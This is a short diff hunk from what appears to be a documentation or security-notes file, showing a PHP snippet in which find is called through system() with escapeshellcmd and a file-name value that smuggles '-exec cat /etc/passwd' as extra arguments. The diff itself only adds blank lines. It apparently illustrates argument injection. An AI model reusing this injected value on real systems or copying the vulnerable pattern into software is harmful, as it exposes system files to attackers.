@@ -15,3 +15,5 @@ updated_at: '2023-04-06T03:55:54.132782+00:00'
 $file = "sth -or -exec cat /etc/passwd ; -quit";
 system("find /tmp -iname ".escapeshellcmd($file));
 ```
+
+
